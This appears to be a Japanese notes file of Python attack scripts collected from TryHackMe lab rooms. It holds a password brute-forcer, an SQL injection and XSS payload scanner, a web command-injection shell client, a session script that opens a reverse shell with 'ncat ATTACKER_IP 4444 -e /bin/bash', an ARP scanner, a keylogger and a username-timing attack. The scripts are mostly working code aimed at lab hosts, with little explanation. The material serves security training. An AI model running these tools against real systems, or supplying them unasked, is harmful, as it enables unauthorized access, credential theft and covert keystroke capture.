# Python ツールの例

https://tryhackme.com/room/customtoolingpython

## 単純なログインブルートフォース

```python
import requests
import string

url = "http://python.thm/labs/lab1/index.php"

username = "mark"

password_list = [f"{str(i).zfill(3)}{c}" for i in range(1000) for c in string.ascii_uppercase]

def brute_force():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)

        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")

brute_force()
```

## 脆弱性スキャナ

```python
import requests
import re
import threading

url = "http://python.thm/labs/lab2/departments.php?name="

payloads = {
    "SQLi": ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"],
    "XSS": ["<script>alert('XSS')</script>", "'><img src=x onerror=alert('XSS')>"]
}

sqli_errors = [
    "SQL syntax","SQLite3::query():", "MySQL server", "syntax error", "Unclosed quotation mark", "near 'SELECT'",
    "Unknown column", "Warning: mysql_fetch", "Fatal error"
]

def scan_payload(vuln_type, payload):
    response = requests.get(url, params={"id": payload})
    content = response.text.lower()

    if vuln_type == "SQLi" and any(error.lower() in content for error in sqli_errors):
        print(f"[+] Potential SQL injection detected with payload: {payload}")

    elif vuln_type == "XSS" and payload.lower() in content:
        print(f"[+] Potential XSS detected with payload: {payload}")

threads = []
for vuln, tests in payloads.items():
    for payload in tests:
        t = threading.Thread(target=scan_payload, args=(vuln, payload))
        threads.append(t)
        t.start()

# Wait for all threads to finish
for t in threads:
    t.join()
```

## 対話型シェル

```python
import requests

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="

print("[+] Interactive Exploit Shell")
while True:
    cmd = input("Shell> ")
    if cmd.lower() in ["exit", "quit"]:
        break

    response = requests.get(TARGET_URL + cmd)

    if response.status_code == 200:
        print(response.text)
    else:
        print("[-] Exploit failed")
```

## セッションを使う

```python
import requests

LOGIN_URL = "http://python.thm/labs/lab4/login.php"
EXECUTE_URL = "http://python.thm/labs/lab4/dashboard.php"
USERNAME = "admin"
PASSWORD = "password123"

def authenticate():
    session = requests.Session()
    response = session.post(LOGIN_URL, data={"username": USERNAME, "password": PASSWORD})

    if "Welcome" in response.text:
        print("[+] Authentication successful.")
        return session
    return None

def execute_command(session, command):
    response = session.post(EXECUTE_URL, data={"cmd": command})

    if "Session expired" in response.text:
        print("[-] Session expired! Re-authenticating...")
        session = authenticate()

    print(f"[+] Output:\n{response.text}")

def get_reverse_shell(session, attacker_ip, attacker_port):
    payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"
    execute_command(session, payload)

session = authenticate()
if session:
    execute_command(session, "whoami")
    get_reverse_shell(session, "ATTACKER_IP", 4444)
```

## ARP スキャナ

https://tryhackme.com/room/pythonforcybersecurity

```python
from scapy.all import *

interface = "eth0"
ip_range = "10.10.X.X/24"
broadcastMac = "ff:ff:ff:ff:ff:ff"

# scapyでパケットの階層構造を表す特殊な構文。演算子をオーバーロードしている。
packet = Ether(dst=broadcastMac)/ARP(pdst = ip_range)

ans, unans = srp(packet, timeout =2, iface=interface, inter=0.1)

for send,receive in ans:
        print (receive.sprintf(r"%Ether.src% - %ARP.psrc%"))
```

## download

```python
import requests

url = 'https://download.sysinternals.com/files/PSTools.zip'
r = requests.get(url, allow_redirects=True)
open('PSTools.zip', 'wb').write(r.content)
```

## キーロガー

記録

```python
import keyboard
import pickle

# 入力を記録（ENTERまで）
events = keyboard.record(until='ENTER')

# ファイルに保存
with open("keystrokes.pkl", "wb") as f:
    pickle.dump(events, f)
```

再生

```python
import keyboard
import pickle

# ファイルから読み込み
with open("keystrokes.pkl", "rb") as f:
    events = pickle.load(f)

# 再生
keyboard.play(events)
```

表示

```python
import keyboard
import pickle

# 保存したpklファイルを読み込み
with open("keystrokes.pkl", "rb") as f:
    events = pickle.load(f)

# 各イベントの内容をテキストで表示
for e in events:
    print(f"time={e.time:.4f}, name={e.name}, event_type={e.event_type}")
```

## タイミング攻撃

https://tryhackme.com/room/hackernote

※「無効ユーザー」と「パスワード間違い」で応答時間が異なるという設定。

```python
# Timing attack exploit on the login form for hackerNote
# You can increase your success chance by adding your own username to the top of the list
# Assumes you have at least ONE correct username, create an account and use that!
import requests as r
import time
import json
URL = "http://localhost:8081/api/user/login"
USERNAME_FILE = open("names.txt", "r")
usernames = []
for line in USERNAME_FILE:  # Read in usernames from the wordlist
    usernames.append(line.replace("\n", ""))

timings = dict()


def doLogin(user):  # Make the HTTP request to the API
    creds = {"username": user, "password": "invalidPassword!"}
    response = r.post(URL, json=creds)
    if response.status_code != 200:  # This means there was an API error
        print("Error:", response.status_code)


print("Starting POST Requests")

for user in usernames:
    # Do a request for every user in the list, and time how long it takes
    startTime = time.time()
    doLogin(user)
    endTime = time.time()
    # record the time for this user along with the username
    timings[user] = endTime - startTime
    # Wait to avoid DoSing the server which causes unreliable results
    time.sleep(0.01)

print("Finished POST requests")

# Longer times normally mean valid usernames as passwords were verified
largestTime = max(timings.values())
smallestTime = min(timings.values())
# Ideally the smallest times should be near instant, and largest should be 1+ seconds
print("Time delta:", largestTime-smallestTime, "seconds (larger is better)")

# A valid username means the server will hash the password
# As this takes time, the longer requests are likely to be valid users
# The longer the request took, the more likely the request is to be valid.
for user, time in timings.items():
    if time >= largestTime * 0.9:
        # with 10% time tolerence
        print(user, "is likely to be valid")
```

